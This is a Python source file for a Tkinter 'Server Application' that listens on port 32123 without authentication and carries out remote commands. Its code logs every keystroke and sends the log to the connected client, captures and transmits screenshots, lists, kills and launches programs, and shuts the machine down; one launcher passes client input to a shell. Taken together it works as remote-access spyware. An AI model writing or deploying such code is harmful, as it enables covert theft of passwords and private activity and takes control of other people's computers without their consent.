import tkinter as tk
import socket
import subprocess
import os
import struct
from PIL import ImageGrab
import psutil
import keyboard

class ServerApp:
    ### init: 1 func
    def __init__(self, root):
        
        def center_widget(widget, root):
            widget.update_idletasks()
            x = (root.winfo_width() - widget.winfo_reqwidth()) // 2
            y = (root.winfo_height() - widget.winfo_reqheight()) // 2
            widgetWidth = int(root.winfo_width() // 350 * 18)
            widget.config(width = widgetWidth, height = int(widgetWidth // 3), highlightbackground = "black")
            widget.place(x = x, y = y)

        def on_window_resize(event):
            center_widget(self.start_button, root)
            
        self.root = root
        self.root.geometry('350x220')
        self.root.title("Server Application")

        self.start_button = tk.Button(root, text = "Start Server", font = "size: 12", command = self.start_server, bg = "#323232", fg = "#FAFAFA", width = 18, height = 6, cursor = "hand2")
        
        center_widget(self.start_button, root)
        self.root.bind("<Configure>", on_window_resize)
        
        self.root.mainloop()
    ###

    ### start server: 1 func
    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('', 32123))
        self.server_socket.listen(5)
        print("Waiting for a connection...")
        self.client_socket, self.client_address = self.server_socket.accept()
        print("Connected to:", self.client_address)

        while True:
            try:
                signal = self.client_socket.recv(1024).decode()
                
                if signal == "KEYLOG":
                    self.keylog()
                elif signal == "SHUTDOWN":
                    self.shutdown()
                elif signal == "TAKEPIC":
                    self.takepic()
                elif signal == "PROCESS":
                    self.process()
                elif signal == "APPLICATION":
                    self.application()
                elif signal == "QUIT":
                    break

            except Exception as e:
                print("Error:", e)
                break

        self.client_socket.shutdown(socket.SHUT_RDWR)
        self.client_socket.close()
        self.server_socket.close()
    ###

    ### screen capture: 1 func
    def takepic(self):
        while True:
            ss = self.client_socket.recv(1024).decode()
            if ss == "TAKE":
                screenshot = ImageGrab.grab()
                screenshot_width, screenshot_height = screenshot.size
                screenshot_bytes = screenshot.tobytes()

                screenshot.save("./screenshot.png", format = "PNG")
                
                length = struct.pack('!Q', len(screenshot_bytes))
                width_bytes = struct.pack('!I', screenshot_width)
                height_bytes = struct.pack('!I', screenshot_height)
                self.client_socket.send(length)
                self.client_socket.send(width_bytes)
                self.client_socket.send(height_bytes)
                self.client_socket.sendall(screenshot_bytes)
                
            elif ss == "QUIT":
                return
    ###

    ### key log: 7 funcs
    def clear_store_file(self):
        with open("keylogger.txt", 'w') as file:
            pass
    
    def save_key_event(self, e):
        with open("keylogger.txt", "a") as f:
            if e.name == 'space':
                f.write(' ')
            elif e.name == 'enter':
                f.write('\n')
            else: 
                f.write(e.name)
    
    def hook_key(self):
        keyboard.on_press(self.save_key_event)

    def unhook(self):
        keyboard.unhook_all()

    def send_data(self, data):
        data_size = struct.pack('!I', len(data))
        self.client_socket.send(data_size)
        self.client_socket.sendall(data.encode())
   
    def printKeylogger(self):
        with open("keylogger.txt", 'r') as file:
            s = file.read()
        self.clear_store_file()
        self.send_data(s)
        
    def keylog(self):
        s = ""
        self.clear_store_file()
        while True:
            s = self.client_socket.recv(1024).decode()
            if s == "PRINT":
                self.printKeylogger()
            elif s == "HOOK":
                self.unhook()
                self.hook_key()
            elif s == "UNHOOK":
                self.unhook()
                self.clear_store_file()
            elif s == "QUIT":
                self.unhook()
                return
    ###

    ### List app: 4 funcs
    def list_apps(self):
        allApps = []
        
        cmd = 'powershell "gps | where {$_.mainWindowTitle} | select Description, ID, @{Name = \'ThreadCount\'; Expression = {$_.Threads.Count}}'
        proc = os.popen(cmd).read().split('\n')
        temp = list()
        for line in proc:
            if not line.isspace():
                temp.append(line)
        temp = temp[3:]
        
        for process in temp:
            try:
                arr = process.split(" ")
                if (len(arr) < 12):
                    continue
                if (arr[0] == ' ' or arr[0] == ''):
                    continue
                
                name = arr[0]
                threads = arr[-1]
                Id = "0"
                cur = len(arr) - 2
                for i in range (cur, -1, -1):
                    if len(arr[i]) != 0:
                        Id = arr[i]
                        cur = i
                        break
                for i in range (1, cur, 1):
                    if len(arr[i]) != 0:
                        name += ' ' + arr[i]
                        
                allApps.append({
                    'name': name,
                    'pid': Id,
                    'num_threads': threads
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        length = len(allApps)
        numApps = struct.pack('!Q', length)
        self.client_socket.send(numApps)
        
        for app in allApps:
            appName = app['name']
            appID = app['pid']
            appNumThreads = app['num_threads']
            
            lenAppName = len(appName.encode())
            lenEncode = struct.pack('!Q', lenAppName)
            self.client_socket.send(lenEncode)
            self.client_socket.send(appName.encode())
            
            lenAppID = len(appID.encode())
            lenIDEncode = struct.pack('!Q', lenAppID)
            self.client_socket.send(lenIDEncode)
            self.client_socket.send(appID.encode())
            
            lenNumThreads = len(appNumThreads.encode())
            lenThreadsEncode = struct.pack('!Q', lenNumThreads)
            self.client_socket.send(lenThreadsEncode)
            self.client_socket.send(appNumThreads.encode())      

    def kill_apps(self, process_id):
        try:
            subprocess.run(["taskkill", "/F", "/T", "/PID", process_id])
            self.client_socket.send("Program has been killed".encode())
        except Exception as ex:
            self.client_socket.send("Error".encode())

    def start_program(self, appName):    
        try:
            subprocess.run(["start", appName], shell = True)
            self.client_socket.send("Program has been turned on".encode())
        except Exception as ex:
            self.client_socket.send("Error".encode())

    def application(self):
        ss = ""
        while True:
            ss = self.client_socket.recv(1024).decode()
            if ss == "VIEW":
                self.list_apps()
            elif ss == "KILL":
                while True:
                    ss = self.client_socket.recv(1024).decode()
                    if ss == "KILLID":
                        appID = self.client_socket.recv(1024).decode()
                        self.kill_apps(appID)
                    elif ss == "QUIT":
                        break
            elif ss == "START": 
                while True:
                    ss = self.client_socket.recv(1024).decode()
                    if ss == "STARTID":
                        appName = self.client_socket.recv(1024).decode()
                        self.start_program(appName)
                    elif ss == "QUIT":
                        break
            elif ss == "QUIT":
                return
    ###

    ### List process: 5 funcs
    def list_process(self):
        allProcess = []
        
        for process in psutil.process_iter(attrs = ['pid', 'name', 'exe', 'cmdline', 'create_time', 'num_threads']):
            try:
                allProcess.append({
                    'name': process.info['name'],
                    'pid': process.info['pid'],
                    'num_threads': process.info['num_threads']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        length = len(allProcess)
        numProcess = struct.pack('!Q', length)
        self.client_socket.send(numProcess)
        
        for Process in allProcess:
            ProcessName = Process['name'].split(".exe")[0] if Process['name'].endswith(".exe") else Process['name']
            ProcessID = Process['pid']
            ProcessIDEncoded = struct.pack('!H', ProcessID)
            ProcessNumThreads = Process['num_threads']
            ProcessNumThreadsEncoded = struct.pack('!H', ProcessNumThreads)
            
            lenProcessName = len(ProcessName.encode())
            lenEncode = struct.pack('!H', lenProcessName)
            self.client_socket.send(lenEncode)
            
            self.client_socket.send(ProcessName.encode())
            self.client_socket.send(ProcessIDEncoded)
            self.client_socket.send(ProcessNumThreadsEncoded)       

    def kill_process(self, process_id):
        try:
            subprocess.run(["taskkill", "/F", "/T", "/PID", process_id])
            self.client_socket.send("Program has been killed".encode())
        except Exception as ex:
            self.client_socket.send("Error".encode())

    def get_exe_files(self, folder_path):
        exe_files = []
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(".exe"):
                    exe_files.append(os.path.join(root, file))
        return exe_files

    def start_program(self, dir_program_name):    
        try:
            subprocess.Popen(dir_program_name)
            self.client_socket.send("Program has been turned on".encode())
        except Exception as ex:
            self.client_socket.send("Error".encode())

    def process(self):
        ss = ""
        while True:
            ss = self.client_socket.recv(1024).decode()
            if ss == "VIEW":
                self.list_process()
            elif ss == "KILL":
                while True:
                    ss = self.client_socket.recv(1024).decode()
                    if ss == "KILLID":
                        process_id = self.client_socket.recv(1024).decode()
                        self.kill_process(process_id)
                    elif ss == "QUIT":
                        break
            elif ss == "START":
                user_folder = os.path.expanduser("~")
                exe_files = self.get_exe_files(user_folder)
                
                length = len(exe_files)
                numProcess = struct.pack('!Q', length)
                self.client_socket.send(numProcess)  
                
                for exe_file in exe_files:
                    file_name = os.path.basename(exe_file)
                    lenProcessName = len(file_name.encode())
                    lenDirName = len(exe_file.encode())
                    
                    lenProcessEncode = struct.pack('!H', lenProcessName)
                    lenDirEncode = struct.pack('!H', lenDirName)
                    
                    self.client_socket.send(lenProcessEncode)
                    self.client_socket.send(file_name.encode())  
                    self.client_socket.send(lenDirEncode)
                    self.client_socket.send(exe_file.encode())  
                    
                while True:
                    ss = self.client_socket.recv(1024).decode()
                    if ss == "STARTID":
                        dir_program_name = self.client_socket.recv(1024).decode()
                        self.start_program(dir_program_name)
                    elif ss == "QUIT":
                        break
            elif ss == "QUIT":
                return
    ###

    ### shutdown: 1 func
    def shutdown(self):
        os.system("shutdown -s")
    ###

if __name__ == "__main__":
    root = tk.Tk()
    app = ServerApp(root)
    root.mainloop()